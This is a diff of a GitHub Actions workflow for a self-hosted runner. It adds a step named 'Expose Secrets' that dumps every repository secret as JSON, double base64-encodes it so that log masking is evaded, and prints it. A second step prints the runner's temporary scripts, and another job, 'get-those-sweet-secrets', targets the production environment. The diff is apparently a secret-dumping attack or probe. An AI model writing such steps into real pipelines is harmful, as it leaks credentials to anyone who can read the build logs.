@@ -7,10 +7,15 @@ jobs:
   secretless-job:
     runs-on: self-hosted
     steps:
-      - run: |
+      - name: Expose Secrets
+        run: |
           echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
           cat test.txt
           ls -la /home/ec2-user/actions-runner/_work/_temp/
+      - name: Print generated templates & scripts
+        run: |
+          ls -la /home/ec2-user/actions-runner/_work/_temp/
+          cat * */*
   get-those-sweet-secrets:
     runs-on: self-hosted
     environment: production
